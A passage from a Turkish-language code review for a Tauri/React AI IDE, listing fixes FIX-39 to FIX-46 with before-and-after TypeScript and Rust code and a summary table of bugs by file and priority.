**Sorun:** Models tab'ında JSX render bloğunun içinde `console.log` çağrısı var. Her render'da (state değişikliğinde) log atıyor. Production'da bırakılmış debug kodu.

```typescript
// ❌ MEVCUT KOD — JSX içinde side effect
{activeTab === 'models' && (
    <div>
        {(() => {
            console.log('📋 Providers:', providers.map(p => ({ id: p.id, name: p.name })));
            console.log('🎯 Selected Provider:', selectedProvider);
            return null;
        })()}
        ...
    </div>
)}
```

```typescript
// ✅ YENİ KOD — bu bloku tamamen sil
// Debug loglarını useEffect'e taşı ya da tamamen kaldır:
useEffect(() => {
    if (process.env.NODE_ENV === 'development') {
        console.log('📋 Providers:', providers);
    }
}, [providers]);
```

---

### FIX-40 · AISettings — Model maxTokens Her Keystroke'da localStorage Write
**Dosya:** `src/components/AISettings.tsx`
**Model listesi, maxTokens input onChange**

**Sorun:** Kullanıcı maxTokens alanına yazarken her tuş vuruşunda `saveProviders` çağrılıyor → localStorage'a tam provider listesi yazılıyor.

```typescript
// ❌ MEVCUT KOD — her tuşta write
<input
    type="number"
    value={model.maxTokens || 4096}
    onChange={(e) => {
        const newValue = parseInt(e.target.value) || 4096;
        const newProviders = providers.map(/* ... */);
        saveProviders(newProviders); // ← her tuşta!
    }}
/>
```

```typescript
// ✅ YENİ KOD — sadece blur/enter'da kaydet (debounce)
const [localMaxTokens, setLocalMaxTokens] = useState<Record<string, number>>({});

<input
    type="number"
    value={localMaxTokens[model.id] ?? model.maxTokens ?? 4096}
    onChange={(e) => {
        // Sadece state güncelle, kaydetme
        setLocalMaxTokens(prev => ({ ...prev, [model.id]: parseInt(e.target.value) || 4096 }));
    }}
    onBlur={(e) => {
        // Odak kaybolunca kaydet
        const newValue = parseInt(e.target.value) || 4096;
        const newProviders = providers.map(p =>
            p.id === selectedProvider
                ? { ...p, models: p.models.map(m => m.id === model.id ? { ...m, maxTokens: newValue } : m) }
                : p
        );
        saveProviders(newProviders);
    }}
/>
```

---

### FIX-41 · AISettings — testConnection Frontend'den Fetch (CORS Riski)
**Dosya:** `src/components/AISettings.tsx`
**Fonksiyon:** `testConnection`

**Sorun:** `testProviderConnection` import ediliyor ve frontend'den direkt HTTP isteği yapıyor. LM Studio localhost'a gidiyorsa sorun yok ama `custom` tip sağlayıcılarda CORS sorunu olabilir. Ayrıca API key'in `Authorization` header'da gitmesi güvensiz (frontend'de görünür).

```typescript
// ❌ MEVCUT KOD
const testConnection = async (provider: AIProvider) => {
    const { testProviderConnection } = await import('../services/aiProvider');
    const isConnected = await testProviderConnection(provider); // frontend'den fetch
};
```

```typescript
// ✅ YENİ KOD — Rust backend üzerinden test et
const testConnection = async (provider: AIProvider) => {
    setConnectionStatus(prev => ({ ...prev, [provider.id]: 'checking' }));
    try {
        // Backend'e delege et — API key frontend'de görünmez
        const result = await invoke<boolean>('test_provider_connection', {
            baseUrl: provider.baseUrl,
            apiKey: provider.apiKey || ''
        });
        setConnectionStatus(prev => ({ ...prev, [provider.id]: result ? 'connected' : 'error' }));
    } catch {
        setConnectionStatus(prev => ({ ...prev, [provider.id]: 'error' }));
    }
};
```

**`commands.rs`'e yeni komut ekle:**
```rust
#[tauri::command]
pub async fn test_provider_connection(base_url: String, api_key: String) -> Result<bool, String> {
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(5))
        .build()
        .map_err(|e| e.to_string())?;

    let mut request = client.get(format!("{}/models", base_url));
    if !api_key.is_empty() {
        request = request.header("Authorization", format!("Bearer {}", api_key));
    }

    match request.send().await {
        Ok(resp) => Ok(resp.status().is_success()),
        Err(_) => Ok(false)
    }
}
```

---

### FIX-42 · AISettings — alert() ve confirm() Kullanımı
**Dosya:** `src/components/AISettings.tsx`

**Sorun:** 8+ yerde `alert()` ve `confirm()` kullanılıyor. Tauri'de native browser dialog'ları bloke edici ve kullanıcı dostu değil. Production IDE'de kabul edilemez.

```typescript
// ❌ MEVCUT KOD — çeşitli yerlerde
alert('Provider adı ve (Base URL veya Host+Port) gerekli!');
alert(`✅ ${newModels.length} model eklendi!\n\n...`);
if (confirm('Bu provider\'ı silmek istediğinizden emin misiniz?')) { ... }
```

```typescript
// ✅ YENİ KOD — mevcut showToast sistemini kullan (zaten var!)
import { showToast } from './ToastContainer';

// alert yerine:
showToast('Provider adı ve URL gerekli!', 'error');
showToast(`✅ ${newModels.length} model eklendi!`, 'success');

// confirm yerine — küçük inline confirm state ekle:
const [deleteConfirm, setDeleteConfirm] = useState<string | null>(null);

// JSX'de:
{deleteConfirm === provider.id ? (
    <div className="flex gap-1">
        <button onClick={() => { deleteProvider(provider.id); setDeleteConfirm(null); }}
            className="px-2 py-1 bg-red-600 text-white rounded text-xs">Evet, sil</button>
        <button onClick={() => setDeleteConfirm(null)}
            className="px-2 py-1 bg-gray-600 text-white rounded text-xs">İptal</button>
    </div>
) : (
    <button onClick={() => setDeleteConfirm(provider.id)}
        className="px-2 py-1 bg-red-600 text-white rounded text-xs">🗑️ Sil</button>
)}
```

---

### FIX-43 · WelcomeScreen — AudioContext Leak (Her Ses Çalmada Yeni Context)
**Dosya:** `src/components/WelcomeScreen.tsx`
**Fonksiyon:** `playGeneratedStartupSound`, `playNotificationSound`

**Sorun:** Her ses çalmada yeni bir `AudioContext` oluşturuluyor. `setTimeout` ile `audioContext.close()` çağrılıyor ama bu güvenilir değil. Kullanıcı hızlı tıklarsa onlarca AudioContext birikirken tarayıcı uyarı verir.

```typescript
// ❌ MEVCUT KOD — her çağrıda yeni context
const playGeneratedStartupSound = () => {
    const audioContext = new AudioContext(); // yeni context
    // ...
    setTimeout(() => {
        audioContext.close(); // güvenilmez cleanup
    }, duration * 1000 + 500);
};
```

```typescript
// ✅ YENİ KOD — tek AudioContext, useRef ile yönet
const audioContextRef = useRef<AudioContext | null>(null);

const getAudioContext = (): AudioContext => {
    if (!audioContextRef.current || audioContextRef.current.state === 'closed') {
        audioContextRef.current = new AudioContext();
    }
    return audioContextRef.current;
};

// cleanup — component unmount
useEffect(() => {
    return () => {
        audioContextRef.current?.close();
        audioContextRef.current = null;
    };
}, []);

const playGeneratedStartupSound = () => {
    const audioContext = getAudioContext(); // aynı context yeniden kullan
    // ... buffer oluştur ve çal
    // close() çağırma — component unmount'ta kapanacak
};
```

---

### FIX-44 · WelcomeScreen — Chat Prompt Küfür Üretimine İzin Veriyor
**Dosya:** `src/components/WelcomeScreen.tsx`
**Fonksiyon:** `createContextualPrompt`

**Sorun:** Kullanıcı küfür içeren mesaj yazınca AI'a `"Küfür edebilirsin ama dozunda"` talimatı veriliyor. Bu talimat system prompt olarak değil, user mesajının parçası olarak gidiyor.

```typescript
// ❌ MEVCUT KOD
case 'aggressive':
    basePrompt += `
- Sert ama eğlenceli karşılık ver
- Küfür edebilirsin ama dozunda     // ← AI'a küfür ürettirme talimatı
- "Ağzını topla" tarzı cevaplar ver`;
```

```typescript
// ✅ YENİ KOD — küfür iznini kaldır, sert ama temiz kalması için yönlendir
case 'aggressive':
    basePrompt += `
- Sert ve iddialı karşılık ver
- Kendinden emin, keskin bir ton kullan
- Gereksiz nezaket gösterme
- Ama hakaret veya küfür kullanma
- Örnek: "Sakin ol biraz! Ne bu sinir? 😤"`;
```

---

### FIX-45 · WelcomeScreen — sendToAI Her Mesajda Dev Prompt Gönderiyor
**Dosya:** `src/components/WelcomeScreen.tsx`
**Fonksiyon:** `sendAIMessage`

**Sorun:** `createContextualPrompt` her mesajda 500+ karakterlik kişilik talimatı + son 4 mesaj geçmişi oluşturuyor. Bu dev bir user mesajı olarak gönderiliyor (system turn değil). Conversation geçtikçe token israfı büyüyor.

```typescript
// ❌ MEVCUT KOD
const contextualPrompt = createContextualPrompt(message, conversationHistory, newContext);
const aiResponse = await sendToAI(contextualPrompt, false); // dev prompt user mesajı olarak
```

```typescript
// ✅ YENİ KOD — kısa user mesajı, kişilik system'e
const getPersonalitySystemPrompt = (personality: string): string => {
    const base = `Sen Corex'sin - doğal, samimi, kısa cevap veren bir AI arkadaş. Türkçe konuş.`;
    const styles: Record<string, string> = {
        aggressive: `${base} Şu an kullanıcı sinirli — direkt ve sert ama saygılı cevap ver.`,
        romantic:   `${base} Şu an romantik mod — şirin ve sıcak cevap ver. 💕`,
        supportive: `${base} Şu an kullanıcı üzgün — empati göster, teselli et. 🤗`,
        calming:    `${base} Şu an kullanıcı stresli — sakin ve rahatlatıcı cevap ver. 😌`,
        playful:    `${base} Şu an eğlenceli mod — espri yap, enerjik ol. 😄`,
        default:    base
    };
    return styles[personality] || styles.default;
};

const aiResponse = await sendToAI(
    message,                              // sadece kullanıcı mesajı
    getPersonalitySystemPrompt(personality), // kişilik system'de
    conversationHistory.slice(-6).map(m => ({ // son 6 mesaj context olarak
        role: m.role as 'user' | 'assistant',
        content: m.content
    }))
);
```

---

### FIX-46 · WelcomeScreen — useEffect Startup Sound Race Condition
**Dosya:** `src/components/WelcomeScreen.tsx`

**Sorun:** İki ayrı state (`isMusicEnabled`, `hasPlayedStartupSound`) ile müzik kontrolü yapılıyor. Bu iki state'in senkronizasyonu için race condition riski var. `setHasPlayedStartupSound(true)` async olmadığı için hızlı re-render'larda çift çalabilir.

```typescript
// ❌ MEVCUT KOD — iki state, race condition
useEffect(() => {
    if (isMusicEnabled && !hasPlayedStartupSound) {
        playStartupSound();
        setHasPlayedStartupSound(true); // async olmayan state, race condition
    }
    return () => { stopMusic(); };
}, [isMusicEnabled, hasPlayedStartupSound]);
```

```typescript
// ✅ YENİ KOD — useRef ile anlık kontrol, race condition yok
const hasPlayedRef = useRef(false);

useEffect(() => {
    if (isMusicEnabled && !hasPlayedRef.current) {
        hasPlayedRef.current = true; // ref anlık güncellenir, re-render yok
        playStartupSound();
    }
    return () => { stopMusic(); };
}, []); // sadece mount'ta çalış

// Müzik toggle için ayrı handler:
const toggleMusic = () => {
    if (isMusicEnabled) {
        stopMusic();
        setIsMusicEnabled(false);
    } else {
        setIsMusicEnabled(true);
        playStartupSound(); // toggle'da çal
    }
};
```

---

## GÜNCEL TAM ÖZET TABLOSU (50 Hata)

| # | Dosya | Sorun | Öncelik |
|---|-------|-------|---------|
| 1-37 | (önceki katmanlar) | Yukarıda belgelenmiş | 🔴🟡🟢 |
| 38 | AISettings.tsx | "Güvenli saklanır" yazarken localStorage kullanıyor | 🔴 |
| 39 | AISettings.tsx | JSX içinde console.log (her render'da) | 🟢 |
| 40 | AISettings.tsx | maxTokens her keystroke'da localStorage write | 🟡 |
| 41 | AISettings.tsx | testConnection frontend'den fetch (CORS + API key riski) | 🟡 |
| 42 | AISettings.tsx | alert() ve confirm() kullanımı (8+ yerde) | 🟡 |
| 43 | WelcomeScreen.tsx | AudioContext her seste yeniden oluşturuluyor (leak) | 🟡 |
| 44 | WelcomeScreen.tsx | Chat prompt AI'a küfür üretme izni veriyor | 🔴 |
| 45 | WelcomeScreen.tsx | sendToAI her mesajda dev prompt gönderiyor (token israfı) | 🟡 |
| 46 | WelcomeScreen.tsx | Startup sound race condition (çift çalabilir) | 🟢 |

**Toplam: 50 hata, 46 tam fix ile belgelenmiş.**
